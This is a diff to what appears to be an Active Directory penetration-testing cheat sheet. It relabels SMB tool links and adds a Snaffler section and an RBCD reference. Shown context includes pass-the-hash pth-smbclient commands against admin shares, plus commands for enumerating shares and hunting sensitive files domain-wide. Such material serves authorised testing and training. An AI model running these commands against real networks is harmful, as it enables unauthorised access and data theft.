@@ -848,7 +848,7 @@ Automated exploitation:
 
 > Some shares can be accessible without authentication, explore them to find some juicy files
 
-* [smbmap](https://github.com/ShawnDEvans/smbmap)
+* [ShawnDEvans/smbmap - a handy SMB enumeration tool](https://github.com/ShawnDEvans/smbmap)
   ```powershell
   smbmap -H 10.10.10.10                # null session
   smbmap -H 10.10.10.10 -R             # recursive listing
@@ -856,7 +856,7 @@ Automated exploitation:
   smbmap -H 10.10.10.10 -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password123*"
   ```
 
-* [pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+* [byt3bl33d3r/pth-smbclient from path-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
   ```powershell
   pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
   pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
@@ -866,7 +866,7 @@ Automated exploitation:
   put # replace a file
   ```
 
-* [smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
+* [SecureAuthCorp/smbclient from Impacket](https://github.com/SecureAuthCorp/impacket)
   ```powershell
   smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
           Sharename       Type      Comment
@@ -895,6 +895,22 @@ Automated exploitation:
   smb: \> lcd '/path/to/go/'
   smb: \> mget *
   ```
+
+
+* [SnaffCon/Snaffler - a tool for pentesters to help find delicious candy](https://github.com/SnaffCon/Snaffler)
+  ```ps1
+  snaffler.exe -s - snaffler.log
+
+  # Snaffle all the computers in the domain
+  ./Snaffler.exe -d domain.local -c <DC> -s
+
+  # Snaffle specific computers
+  ./Snaffler.exe -n computer1,computer2 -s
+  ​
+  # Snaffle a specific directory
+  ./Snaffler.exe -i C:\ -s
+  ```
+
 
 ### SCF and URL file attack against writeable share
 
@@ -4032,3 +4048,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
 * [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
 * [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
+* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
